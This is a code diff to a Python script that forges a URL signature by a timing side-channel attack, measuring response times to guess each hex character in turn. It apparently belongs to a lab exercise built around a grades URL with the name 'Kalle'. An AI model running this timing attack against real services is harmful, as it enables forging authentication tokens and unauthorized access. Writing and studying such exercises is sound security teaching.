@@ -1,7 +1,10 @@
 import time
 import ssl
 import statistics
-from urllib.request import urlopen
+try:
+    from urllib.request import urlopen
+except ImportError:
+    from urllib2 import urlopen
 
 
 def buildSignature(url):
@@ -9,7 +12,7 @@ def buildSignature(url):
     while (len(signature) < 20):
         elapsed_longest = 0.0
         bestHex = ""
-        tries = 6 + (3 * len(signature))
+        tries = 12
 
         for testValue in range(0, 16):
             hexValueToAdd = hex(testValue)[2:]
@@ -49,15 +52,12 @@ def attack(name, grade):
     url = str(basic_url) + str(target_url)
 
     signature = buildSignature(url)
-
     correct_url = url + signature
-    print("Correct url:", correct_url)
-    print("Correct signature:", signature)
-    return correct_url
+    return signature, correct_url
 
 
 totalt_time_start = time.time()
-signature = attack("Kalle", 5)
+signature, url = attack("Kalle", 5)
 totalt_time_fin = time.time()
 print()
 print("---------------------------------------")
